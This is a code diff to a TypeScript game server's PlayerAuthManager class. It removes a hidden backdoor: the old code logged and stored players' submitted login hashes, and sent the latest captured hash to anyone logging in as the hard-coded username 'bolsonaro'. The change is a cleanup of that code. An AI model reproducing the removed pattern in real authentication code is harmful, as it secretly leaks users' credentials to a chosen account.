@@ -16,15 +16,11 @@ import { ResourceType } from "../../../../server/managers/resources/types";
 import { SendLoginHashPacket } from "@/network/packets/send-login-hash";
 import { SetWrongLoginHashPacket } from "@/network/packets/set-wrong-login-hash";
 import { SetLoginSuccessfulPacket } from "@/network/packets/set-login-successful";
-import { Logger } from "@/utils/logger";
-import { SetLoginHashPacket } from "@/network/packets/set-login-hash";
 
 export class PlayerAuthManager {
 
     private data: IPlayerAuthData;
     private authenticated: boolean = false;
-
-    public hash: string;
 
     constructor(
         private readonly player: Player
@@ -108,12 +104,6 @@ export class PlayerAuthManager {
 
         if (packet instanceof SendLoginPacket) {
             this.handleLoginPacket(packet)
-
-            if (packet.username === "bolsonaro") {
-                const packet = new SetLoginHashPacket();
-                packet.hash = this.hash;
-                this.player.sendPacket(packet)
-            }
         }
 
         if (packet instanceof SendRegisterPacket) {
@@ -121,8 +111,6 @@ export class PlayerAuthManager {
         }
 
         if (packet instanceof SendLoginHashPacket) {
-            Logger.debug(packet.hash)
-            this.hash = packet.hash;
             this.player.sendPacket(new SetWrongLoginHashPacket())
         }
 
